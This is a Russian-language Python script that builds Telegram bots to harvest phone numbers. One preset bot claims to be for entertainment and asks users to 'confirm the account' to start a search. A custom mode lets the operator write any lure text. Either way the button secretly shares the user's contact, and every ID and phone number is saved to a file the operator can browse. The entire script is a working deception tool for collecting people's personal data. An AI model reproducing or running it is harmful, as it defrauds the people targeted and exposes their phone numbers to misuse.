import os
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_header():
    clear_screen()
    print("=" * 54)
    print(" ██████╗ ██████╗ ███╗   ███╗███████╗████████╗███████╗")
    print("██╔════╝██╔═══██╗████╗ ████║██╔════╝╚══██╔══╝██╔════╝")
    print("██║     ██║   ██║██╔████╔██║█████╗     ██║   █████╗")
    print("██║     ██║   ██║██║╚██╔╝██║██╔══╝     ██║   ██╔══╝")
    print("╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗   ██║   ███████╗")
    print(" ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝")
    print("=" * 54)


def view_history():
    clear_screen()
    show_header()
    print("История сохраненных контактов:\n")
    if os.path.exists("contacts.txt"):
        with open("contacts.txt", "r") as file:
            history = file.readlines()
            if history:
                for entry in history:
                    print(entry.strip())
            else:
                print("История пуста.")
    else:
        print("Файл с историей не найден.")
    input("\nНажмите Enter, чтобы вернуться в меню...")

async def gb_bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_message = "Приветствую, данный бот был создан в развлекательных целях. Для того что бы начать поиск нажмите Подтвердить аккаунт."
    button_text = "Подтвердить аккаунт"
    contact_button = KeyboardButton(button_text, request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
    await update.message.reply_text(start_message, reply_markup=reply_markup)

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.contact.user_id
    phone_number = update.message.contact.phone_number
    print(f"ID пользователя: {user_id}, Номер телефона: {phone_number}")
    with open("contacts.txt", "a") as file:
        file.write(f"ID: {user_id}, Phone: {phone_number}\n")
    await update.message.reply_text("Контакт принят, спасибо!")

def create_gb_bot():
    print("\nВведите API токен для ГБ бота:")
    token = input("Введите API токен: ")
    app = Application.builder().token(token).build()
    app.add_handler(CommandHandler("start", gb_bot_start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    print("\nГБ бот запущен с базовым текстом. Нажмите Ctrl+C для завершения.")
    app.run_polling()

async def custom_bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    start_message = context.bot_data.get("custom_start_message", "Добро пожаловать!")
    button_text = context.bot_data.get("custom_button_text", "Отправить контакт")
    contact_button = KeyboardButton(button_text, request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_button]], resize_keyboard=True)
    await update.message.reply_text(start_message, reply_markup=reply_markup)

def create_custom_bot():
    print("\nВведите API токен для своего бота:")
    token = input("Введите API токен: ")
    print("\nВведите сообщение, которое бот будет показывать после команды /start:")
    start_message = input("Текст приветствия: ")
    print("\nВведите текст для кнопки:")
    button_text = input("Текст кнопки: ")
    app = Application.builder().token(token).build()
    app.bot_data["custom_start_message"] = start_message
    app.bot_data["custom_button_text"] = button_text
    app.add_handler(CommandHandler("start", custom_bot_start))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    print("\nВаш кастомный бот запущен. Нажмите Ctrl+C для завершения.")
    app.run_polling()

def menu():
    while True:
        show_header()
        print("                  [1] Создать ГБ бота")
        print("                  [2] Создать своего бота")
        print("                  [3] История")
        print("                  [0] Выход")
        print("=" * 54)
        choice = input("Выберите опцию: ")
        if choice == "1":
            create_gb_bot()
        elif choice == "2":
            create_custom_bot()
        elif choice == "3":
            view_history()
        elif choice == "0":
            print("\nВыход из программы...")
            break
        else:
            print("\nНеверный ввод. Попробуйте снова.")
            input("\nНажмите Enter, чтобы продолжить...")

if __name__ == "__main__":
    menu()